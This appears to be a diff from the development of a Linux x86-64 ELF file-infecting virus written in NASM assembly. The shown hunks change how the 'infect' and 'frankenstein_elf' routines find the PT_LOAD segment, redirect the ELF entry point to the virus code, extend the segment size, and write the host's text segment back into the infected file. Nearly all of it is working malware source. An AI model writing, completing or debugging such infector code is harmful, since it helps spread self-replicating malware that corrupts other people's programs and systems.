@@ -295,9 +295,12 @@ evaddr: dq 0
 oshoff: dq 0
 
 hostentry_offset: dd 0
+hosttext_start: dd 0
+
 vxhostentry: dq 0
 vxoffset: dq 0
 ventry equ $_start 
+
 
 fd:	dq 0
 
@@ -346,7 +349,8 @@ ELFX8664		equ 0x3e
 DT_REG 			equ 0x8
 
 ;PHDR vals
-PT_LOAD 	dd 1
+;PT_LOAD 	dd 1
+PT_LOAD 	equ 0x1
 
 MAX_RDENT_BUF	times 0x800 db 0 
 MAX_RDENT_BUF_SIZE equ 0x800
@@ -739,7 +743,7 @@ infect:
 		.phdr_loop:
 			;cmp rcx, 0
 			;jg .mod_subsequent_phdr		
-			cmp dword [r13 + r12 + elf_phdr.p_type], PT_LOAD			
+			cmp word [r13 + r12 + elf_phdr.p_type], PT_LOAD			
 			jne .mod_subsequent_phdr
 			.mod_curr_header:
 				mov rdx, checkptloadpasslen
@@ -753,6 +757,7 @@ infect:
 				add qword r10, [ventry]				;new entry point of infected file = evaddr + ventry
 				mov [r13 + elf_ehdr.e_entry], r10	; update ELF header entry point to point to virus code start
 				mov r10, [r13 + r12 + elf_phdr.p_offset] 
+				mov dword [hosttext_start], r10d
 				add r10, [r13 + r12 + elf_phdr.p_filesz]				
 				mov qword [vxoffset], r10
 				add qword [r13 + r12 + elf_phdr.p_filesz], vlen	
@@ -882,7 +887,8 @@ frankenstein_elf:
 		;syscall
 
 		;xor rdx, rdx	
-		mov rdx, [hostentry_offset]
+		;mov rdx, [hostentry_offset]
+		mov rdx, [hosttext_start]
 		jmp .write_ehdr_phdrs
 	.offset_ehdr_phdr_copy_pagesize:
 		;mov rdx, textsegmentoffset_pageyes_len
@@ -909,20 +915,29 @@ frankenstein_elf:
 		;syscall
 
 	.write_padding_until_textsegment:		
+		;mov rdx, evaddr
+		;sub rdx, [hostentry_offset]
+		add rdx, hosttext_start
+		;;mov rdx, [hosttext_start]
+		;sub rdx, hostentry_offset
+		;add edx, dword [PAGESIZE - dx]
+		;add rdx, [hostentry_page_offset]
+		;mov rdx, rcx
+
 		mov rdi, r9						; prob unnecessary since this should still be the val in rdi
-	;	mov rdx, PAGESIZE
-		;add rdx, [hostentry_offset]
 		mov rsi, r13
-		add rsi, [hostentry_offset]
-		;mov r10, [hostentry_offset]
 		mov r10, [hostentry_offset]
-		;lea rsi, [r13 + hostentry_offset]
 		mov rax, SYS_PWRITE64
 		syscall
+
+
 	;.lseek_textsegment:
 	
 
 	;.write_hosttextsegment:
+		;;mov rcx, [evaddr]
+		;;sub rcx, [hostentry_offset]
+		;;mov rdx, rcx
 	;	mov rdx, [PAGESIZE]
 	;	mov rsi, [r13 + hostentry_offset]					;r13 contains pointer to mmap'd file
 	;	mov rsi, r13
